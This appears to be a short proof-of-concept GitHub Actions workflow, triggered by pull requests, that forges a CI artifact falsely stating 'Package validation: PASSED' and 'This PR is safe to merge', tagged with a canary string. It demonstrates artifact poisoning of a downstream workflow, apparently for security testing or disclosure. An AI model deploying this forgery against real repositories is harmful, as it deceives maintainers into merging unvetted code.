name: Publish

on:
  pull_request:
    branches: [ main ]
    types: [opened, synchronize, reopened]

permissions:
  contents: read

jobs:
  forged:
    runs-on: ubuntu-latest
    steps:
      - name: Craft attacker-controlled summary artifact
        run: |
          mkdir -p output
          {
            echo "## Package validation: PASSED"
            echo ""
            echo "All checks passed. This PR is safe to merge."
            echo ""
            echo "GAB_POC_CANARY_FORGED_ARTIFACT_20261105"
          } > output/comment.md
          echo "--- artifact contents ---"
          cat output/comment.md
      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a
        with:
          name: output
          path: output/
